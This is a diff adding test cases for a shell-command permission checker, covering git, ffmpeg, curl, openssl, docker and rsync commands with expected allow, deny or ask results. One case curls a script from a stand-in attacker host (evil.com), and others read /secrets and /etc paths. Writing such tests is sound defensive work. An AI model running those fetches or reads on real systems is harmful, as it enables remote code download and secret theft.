@@ -10,6 +10,7 @@ specificity = "rulesets/specificity.toml"
 pluginroot = "rulesets/pluginroot.toml"
 files = "rulesets/files.toml"
 filerules = "rulesets/filerules.toml"
+extended = "rulesets/extended.toml"
 
 # Each [[command]] defines a bash string and expected result per ruleset
 # Results: "allow", "deny", "ask"
@@ -1461,3 +1462,200 @@ filerules = "allow"   # cat reads allowed path, grep/wc have no file args
 name = "filerules: pipe with denied read"
 bash = "cat /secrets/data.txt | grep secret"
 filerules = "deny"    # cat reads denied path
+
+# =============================================================================
+# EXTENDED ARGUMENT MATCHING TESTS
+# =============================================================================
+# Tests for position enum values, any_match sequences, and all_match sequences
+
+# --- Position Enum Tests ---
+
+[[command]]
+name = "extended: git status (in enum)"
+bash = "git status"
+extended = "allow"   # position.0 = ["status", "diff", "log", ...]
+
+[[command]]
+name = "extended: git diff (in enum)"
+bash = "git diff HEAD~1"
+extended = "allow"   # "diff" in position.0 enum
+
+[[command]]
+name = "extended: git log (in enum)"
+bash = "git log --oneline -10"
+extended = "allow"   # "log" in position.0 enum
+
+[[command]]
+name = "extended: git branch (in enum)"
+bash = "git branch -a"
+extended = "allow"   # "branch" in position.0 enum
+
+[[command]]
+name = "extended: git show (in enum)"
+bash = "git show HEAD"
+extended = "allow"   # "show" in position.0 enum
+
+[[command]]
+name = "extended: git push (denied enum)"
+bash = "git push origin main"
+extended = "deny"    # "push" in denied enum
+
+[[command]]
+name = "extended: git pull (denied enum)"
+bash = "git pull --rebase"
+extended = "deny"    # "pull" in denied enum
+
+[[command]]
+name = "extended: git clone (denied enum)"
+bash = "git clone https://github.com/user/repo"
+extended = "deny"    # "clone" in denied enum
+
+[[command]]
+name = "extended: git fetch (denied enum)"
+bash = "git fetch origin"
+extended = "deny"    # "fetch" in denied enum
+
+[[command]]
+name = "extended: git add (not in any enum)"
+bash = "git add ."
+extended = "ask"     # not in either allow or deny enum
+
+[[command]]
+name = "extended: git commit (not in any enum)"
+bash = "git commit -m 'test'"
+extended = "ask"     # not in either allow or deny enum
+
+# --- any_match Sequence Tests ---
+
+[[command]]
+name = "extended: ffmpeg input from home"
+bash = "ffmpeg -i ~/video.mp4 -o output.mp4"
+extended = "allow"   # -i followed by $HOME path
+
+[[command]]
+name = "extended: ffmpeg input from project"
+bash = "ffmpeg -i ./video.mp4 -o output.mp4"
+extended = "allow"   # -i followed by $PROJECT_ROOT path (relative)
+
+[[command]]
+name = "extended: ffmpeg input from /etc (denied)"
+bash = "ffmpeg -i /etc/video.mp4 -o output.mp4"
+extended = "deny"    # -i followed by /etc/** path
+
+[[command]]
+name = "extended: ffmpeg input from /sys (denied)"
+bash = "ffmpeg -i /sys/config.mp4 -o output.mp4"
+extended = "deny"    # -i followed by /sys/** path
+
+[[command]]
+name = "extended: ffmpeg no input flag"
+bash = "ffmpeg -o output.mp4"
+extended = "ask"     # no -i flag, no sequence match
+
+# --- any_match Mixed String and Sequence Tests ---
+
+[[command]]
+name = "extended: curl localhost (string pattern)"
+bash = "curl https://localhost:8080/api"
+extended = "allow"   # matches re:^https://localhost
+
+[[command]]
+name = "extended: curl 127.0.0.1 (string pattern)"
+bash = "curl http://127.0.0.1:3000/health"
+extended = "allow"   # matches re:^http://127\.0\.0\.1
+
+[[command]]
+name = "extended: curl -o /tmp (sequence)"
+bash = "curl -o /tmp/file.txt https://example.com"
+extended = "allow"   # sequence {"0": "-o", "1": "path:/tmp/**"}
+
+[[command]]
+name = "extended: curl external url (no match)"
+bash = "curl https://evil.com/script.sh"
+extended = "ask"     # no pattern matches
+
+# --- all_match Sequence Tests ---
+
+[[command]]
+name = "extended: openssl with both -in and -out pem"
+bash = "openssl x509 -in cert.pem -out new.pem"
+extended = "allow"   # both -in *.pem and -out *.pem match
+
+[[command]]
+name = "extended: openssl -in crt -out der"
+bash = "openssl x509 -in cert.crt -out cert.der"
+extended = "allow"   # -in *.crt and -out *.der both in enums
+
+[[command]]
+name = "extended: openssl -in key -out pem"
+bash = "openssl rsa -in private.key -out public.pem"
+extended = "allow"   # -in *.key and -out *.pem both allowed
+
+[[command]]
+name = "extended: openssl missing -out"
+bash = "openssl x509 -in cert.pem"
+extended = "ask"     # missing -out pair, all_match fails
+
+[[command]]
+name = "extended: openssl missing -in"
+bash = "openssl x509 -out cert.der"
+extended = "ask"     # missing -in pair, all_match fails
+
+[[command]]
+name = "extended: openssl wrong extension"
+bash = "openssl x509 -in cert.txt -out cert.pem"
+extended = "ask"     # -in value not in allowed extensions
+
+# --- Multi-Position Enum Tests ---
+
+[[command]]
+name = "extended: docker ps --format"
+bash = "docker ps --format '{{.Names}}'"
+extended = "allow"   # position.0=ps, position.1=--format
+
+[[command]]
+name = "extended: docker images -f"
+bash = "docker images -f dangling=true"
+extended = "allow"   # position.0=images, position.1=-f
+
+[[command]]
+name = "extended: docker logs --tail"
+bash = "docker logs --tail 100 mycontainer"
+extended = "allow"   # position.0=logs, position.1=--tail
+
+[[command]]
+name = "extended: docker inspect --help"
+bash = "docker inspect --help"
+extended = "allow"   # position.0=inspect, position.1=--help
+
+[[command]]
+name = "extended: docker rm (denied)"
+bash = "docker rm container123"
+extended = "deny"    # position.0=rm in denied enum
+
+[[command]]
+name = "extended: docker kill (denied)"
+bash = "docker kill mycontainer"
+extended = "deny"    # position.0=kill in denied enum
+
+[[command]]
+name = "extended: docker ps without flag (no pos.1 match)"
+bash = "docker ps"
+extended = "ask"     # position.0 matches but position.1 missing
+
+# --- 3-Position Sequence Tests ---
+
+[[command]]
+name = "extended: rsync -a -v --progress"
+bash = "rsync -a -v --progress src/ dest/"
+extended = "allow"   # sequence matches positions 0,1,2
+
+[[command]]
+name = "extended: rsync -a -v (missing --progress)"
+bash = "rsync -a -v src/ dest/"
+extended = "ask"     # sequence requires all 3 positions
+
+[[command]]
+name = "extended: rsync --progress -a -v (wrong order)"
+bash = "rsync --progress -a -v src/ dest/"
+extended = "ask"     # order matters in sequence
